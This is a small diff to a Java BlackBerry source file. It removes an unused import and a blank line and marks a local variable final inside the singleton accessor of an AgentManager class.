@@ -12,9 +12,7 @@ package blackberry;
 import java.util.Vector;
 
 import net.rim.device.api.system.RuntimeStore;
-
 import blackberry.agent.Agent;
-import blackberry.config.Keys;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.interfaces.Singleton;
@@ -46,7 +44,7 @@ public final class AgentManager extends Manager implements Singleton {
         if (instance == null) {
             instance = (AgentManager) RuntimeStore.getRuntimeStore().get(GUID);
             if (instance == null) {
-                AgentManager singleton = new AgentManager();
+                final AgentManager singleton = new AgentManager();
                 RuntimeStore.getRuntimeStore().put(GUID, singleton);
                 instance = singleton;
             }
